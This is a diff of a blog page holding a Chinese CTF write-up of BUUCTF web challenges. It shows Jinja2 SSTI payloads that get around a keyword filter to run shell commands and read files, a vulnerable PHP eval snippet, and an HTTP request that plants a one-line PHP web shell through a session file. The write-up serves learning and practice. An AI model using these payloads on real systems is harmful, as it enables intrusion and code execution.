@@ -1,13 +1,179 @@
-<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="referrer" content="no-referrer"><meta name="google-site-verification" content="YKwcqblwsZCg-ylX8b6YPzjmkIRadB3nD8IU3XMN6gg"><title>BUUCTF Web Writeup 3 | Boogiepop Doesn't Laugh</title><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
-if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
- font-family: BenderLight;
- src: local('Bender'), url("/font/BenderLight.ttf");
-}
-@font-face {
- font-family: 'JetBrains Mono';
- src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
-}</style><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Boogiepop Doesn't Laugh" type="application/atom+xml">
-</head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>BUUCTF Web Writeup 3</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-04-08T16:03:41.570Z" id="date"> 2023-04-09</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-04-08T15:47:21.353Z" id="updated"> 2023-04-08</time></div></span></div></div><hr><div id="post-content"><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>看题目就知道是Flask框架：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573336081-2e3375bc-6b40-468e-b415-ff8264274505.png#averageHue=%23eaeaea&clientId=uf835df04-24de-4&from=paste&height=461&id=ub30f5767&name=image.png&originHeight=576&originWidth=1757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87839&status=done&style=none&taskId=u5fe44a8d-73fa-4125-b396-229bab4b32d&title=&width=1405.6" alt="image.png"><br>一个简易加密框，还有个解密框，对应的是base64加解密，提示里面没东西<br>经过测试，将<code>&#123;&#123;1+1&#125;&#125;</code>加密后，放到解密框：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573389307-89edf548-ad94-42c7-bfb5-fd16eb2a4c36.png#averageHue=%23f7f6f6&clientId=uf835df04-24de-4&from=paste&height=413&id=u59686e7f&name=image.png&originHeight=516&originWidth=1616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69744&status=done&style=none&taskId=ue83a9eb1-3eef-48f8-9e89-ffda1e3aa71&title=&width=1292.8" alt="image.png"><br>答案为2，存在SSTI注入，经过一系列的测试，发现目标ban掉了os,popen,request<br>但是没ban连接符，那等于没ban，直接放payload<br><code>&#123;&#123;url_for.__globals__.get('o'+'s')['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()&#125;&#125;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573437606-5025ee86-0b17-43b3-a0ac-e5ba5f676d7e.png#averageHue=%23faf8ec&clientId=uf835df04-24de-4&from=paste&height=94&id=u3df9180e&name=image.png&originHeight=117&originWidth=1415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16120&status=done&style=none&taskId=u93bd695f-704c-4bd4-ac73-d9ad39784a6&title=&width=1132" alt="image.png"></p>
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>BUUCTF Web Writeup 3 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="BUUCTF Web Writeup 3 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/04/09/BUUCTF3/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-08T16:03:41.570Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/In-Challenge/">In Challenge</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>9,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">BUUCTF Web Writeup 3</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>看题目就知道是Flask框架：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573336081-2e3375bc-6b40-468e-b415-ff8264274505.png#averageHue=%23eaeaea&clientId=uf835df04-24de-4&from=paste&height=461&id=ub30f5767&name=image.png&originHeight=576&originWidth=1757&originalType=binary&ratio=1&rotation=0&showTitle=false&size=87839&status=done&style=none&taskId=u5fe44a8d-73fa-4125-b396-229bab4b32d&title=&width=1405.6" alt="image.png"><br>一个简易加密框，还有个解密框，对应的是base64加解密，提示里面没东西<br>经过测试，将<code>&#123;&#123;1+1&#125;&#125;</code>加密后，放到解密框：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573389307-89edf548-ad94-42c7-bfb5-fd16eb2a4c36.png#averageHue=%23f7f6f6&clientId=uf835df04-24de-4&from=paste&height=413&id=u59686e7f&name=image.png&originHeight=516&originWidth=1616&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69744&status=done&style=none&taskId=ue83a9eb1-3eef-48f8-9e89-ffda1e3aa71&title=&width=1292.8" alt="image.png"><br>答案为2，存在SSTI注入，经过一系列的测试，发现目标ban掉了os,popen,request<br>但是没ban连接符，那等于没ban，直接放payload<br><code>&#123;&#123;url_for.__globals__.get('o'+'s')['po'+'pen']('cat /this_is_the_fl'+'ag.txt').read()&#125;&#125;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573437606-5025ee86-0b17-43b3-a0ac-e5ba5f676d7e.png#averageHue=%23faf8ec&clientId=uf835df04-24de-4&from=paste&height=94&id=u3df9180e&name=image.png&originHeight=117&originWidth=1415&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16120&status=done&style=none&taskId=u93bd695f-704c-4bd4-ac73-d9ad39784a6&title=&width=1132" alt="image.png"></p>
 <p>后面看了一下网上的WP，大致思路和我的差不多，其实可以读到一些源码，提示里说了失败是成功之母，那就是让他报错：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666573965550-db3866f2-293b-4f60-a18b-1fd37b292481.png#averageHue=%23fcfbf9&clientId=uf835df04-24de-4&from=paste&height=334&id=u17094b15&name=image.png&originHeight=418&originWidth=975&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30703&status=done&style=none&taskId=u487333fb-5dcd-424b-8584-532062e2eec&title=&width=780" alt="image.png"><br>不读也无所谓，附上一个使用catch_warning的payload<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>EZEZ</p>
 <h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>本以为这题没什么，实际上感觉还挺有意思的</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -235,22 +401,149 @@ if (window.localStorage.getItem('theme-mode') === 'dark') document.documentEleme
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /home/member/search HTTP/1.1</span><br><span class="line">Host: 405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 5</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81/home/member/search</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=bbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">key=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
 <p>同样改包发送，这里的key就是我们一句话木马的内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669356389226-788714a0-1afc-4178-af44-1f4104dcd2cc.png#averageHue=%23ebd1a0&clientId=u14d9fba1-5b10-4&from=paste&height=119&id=u6d6cfbad&name=image.png&originHeight=149&originWidth=1453&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15048&status=done&style=none&taskId=u00e19066-f96d-40c5-897a-624b493ed5d&title=&width=1162.4" alt="image.png"><br>访问<code>/runtime/session/sess_bbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</code><br>即可getshell，在phpinfo界面发现有disabled_function限制，这里用蚁剑自带的UAF去绕过即可，最后再根目录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669356439108-af601a46-9bef-4f77-943f-c7071d18ba5b.png#averageHue=%230e0e0e&clientId=u14d9fba1-5b10-4&from=paste&height=298&id=ubf3d20c8&name=image.png&originHeight=372&originWidth=773&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35990&status=done&style=none&taskId=u831ae215-3e99-4e02-8503-c739abe3f14&title=&width=618.4" alt="image.png"><br>可以看见flag没有读的权限，但是有个readflag，运行即可获得flag</p>
 <p>第三页结束啦！</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/09/BUUCTF4/">← Next BUUCTF Web Writeup 4</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/09/BUUCTF1-2/">BUUCTF Web Writeup 1-2 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Boogipop</a></h1><div id="description"><p>Are you still in pain?</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-FlaskApp"><span class="toc-number">1.</span> <span class="toc-text">[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">2.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UNCTF2020-easy-flask2"><span class="toc-number">3.</span> <span class="toc-text">[UNCTF2020]easy_flask2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.</span> <span class="toc-text">[WUSTCTF2020]颜值成绩查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRCTF2020-%E5%A5%97%E5%A8%83"><span class="toc-number">5.</span> <span class="toc-text">[MRCTF2020]套娃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zer0pts2020-Can-you-guess-it"><span class="toc-number">6.</span> <span class="toc-text">[Zer0pts2020]Can you guess it?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun"><span class="toc-number">7.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web2]ikun</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSCCTF-2019-Qual-FlaskLight"><span class="toc-number">8.</span> <span class="toc-text">[CSCCTF 2019 Qual]FlaskLight</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96"><span class="toc-number">9.</span> <span class="toc-text">[GWCTF 2019]枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-True-XML-cookbook"><span class="toc-number">10.</span> <span class="toc-text">[NCTF2019]True XML cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox"><span class="toc-number">11.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web1]Dropbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCTF2015-EasySQL"><span class="toc-number">12.</span> <span class="toc-text">[RCTF2015]EasySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WUSTCTF2020-CV-Maker"><span class="toc-number">13.</span> <span class="toc-text">[WUSTCTF2020]CV Maker</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk"><span class="toc-number">14.</span> <span class="toc-text">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown"><span class="toc-number">15.</span> <span class="toc-text">[网鼎杯 2020 白虎组]PicDown</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb"><span class="toc-number">16.</span> <span class="toc-text">[CISCN2019 总决赛 Day2 Web1]Easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON-2017-SSRFme"><span class="toc-number">17.</span> <span class="toc-text">[HITCON 2017]SSRFme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell"><span class="toc-number">18.</span> <span class="toc-text">[红明谷CTF 2021]write_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#watevrCTF-2019-Cookie-Store"><span class="toc-number">19.</span> <span class="toc-text">[watevrCTF-2019]Cookie Store</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HFCTF2020-EasyLogin"><span class="toc-number">20.</span> <span class="toc-text">[HFCTF2020]EasyLogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#b01lers2020-Welcome-to-Earth"><span class="toc-number">21.</span> <span class="toc-text">[b01lers2020]Welcome to Earth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Ezsqli"><span class="toc-number">22.</span> <span class="toc-text">[GYCTF2020]Ezsqli</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Comment"><span class="toc-number">23.</span> <span class="toc-text">[网鼎杯 2018]Comment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2018-SimplePHP"><span class="toc-number">24.</span> <span class="toc-text">[SWPUCTF 2018]SimplePHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-SQLi"><span class="toc-number">25.</span> <span class="toc-text">[NCTF2019]SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RootersCTF2019-I-lt-3-Flask"><span class="toc-number">26.</span> <span class="toc-text">[RootersCTF2019]I_&lt;3_Flask</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NPUCTF2020-ezinclude"><span class="toc-number">27.</span> <span class="toc-text">[NPUCTF2020]ezinclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-encode-and-encode"><span class="toc-number">28.</span> <span class="toc-text">HarekazeCTF2019]encode_and_encode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUCTF-2019-EasyWeb"><span class="toc-number">29.</span> <span class="toc-text">[SUCTF 2019]EasyWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret"><span class="toc-number">30.</span> <span class="toc-text">[CISCN2019 华东南赛区]Double Secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Unfinish"><span class="toc-number">31.</span> <span class="toc-text">[网鼎杯2018]Unfinish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-EasyThinking"><span class="toc-number">32.</span> <span class="toc-text">[GYCTF2020]EasyThinking</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
- el: '#valine'
- , appId: '4KNp8mNp9RkLrDSktdFbmIO8-gzGzoHsz'
- , appKey: 'I3KhKOyWDf9eRRnVEAit98wt' , placeholder: 'This comment is sent by Penguin Logistics.'
- , path: window.location.pathname
-});code.findCode();}</script><script src="/js/arknights.js"></script><script src="/js/pjax.js"></script><script>window.addEventListener("load",() => {pjax = new Pjax({
- cacheBust: false,
- selectors: ['title','article','#aside-block','.pjax-js'],
- switches: {'article': Pjax.switches.sideBySide},
- switchesOptions: {
-   'article': {
-     classNames: {
-       remove: "pjax-out",
-       add: "pjax-in"
-     }
-   }
- }
-});
-document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/09/BUUCTF4/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">BUUCTF Web Writeup 4</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/09/BUUCTF1-2/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">BUUCTF Web Writeup 1-2</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2023 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
